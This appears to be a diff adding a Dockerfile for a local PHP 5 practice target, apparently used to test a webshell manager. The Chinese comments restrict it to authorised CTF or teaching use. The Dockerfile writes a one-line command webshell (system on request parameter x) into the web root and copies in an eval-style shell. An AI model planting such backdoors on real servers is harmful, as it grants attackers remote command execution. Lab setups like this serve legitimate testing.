@@ -1,0 +1,28 @@
+# PHP 5 靶机环境（教学 / CTF 靶场专用）
+#
+# 仅用于你自有或已获明确授权的靶机，勿用于任何未授权环境。
+#
+# 构建（在 tests/webshell 目录内执行，构建上下文即本目录）：
+#   cd tests/webshell && docker build -t weshell-php5 .
+#
+# 运行：
+#   docker run --rm -p 8081:80 weshell-php5
+#
+# 运行后在管理端添加靶标，URL 例如：
+#   php-eval 型：http://127.0.0.1:8081/shell_eval.php   连接参数名 x
+#   php-cmd  型：http://127.0.0.1:8081/shell_cmd.php    连接参数名 x
+
+FROM php:5.6-apache
+
+# 打开错误显示，便于教学时直接对照命令报错的回显
+RUN echo "display_errors=On" >> /usr/local/etc/php/php.ini
+
+# 两种 webshell 样本，参数名统一为 x，与管理端 php-eval / php-cmd 类型对应
+# php-eval：管理端提交一小段 PHP 代码，回显最准确
+COPY shell_eval.php /var/www/html/shell_eval.php
+# php-cmd：管理端直接提交系统命令，回显为响应体原文
+RUN echo "<?php system(\$_REQUEST['x']);?>" > /var/www/html/shell_cmd.php
+
+EXPOSE 80
+
+CMD ["apache2-foreground"]
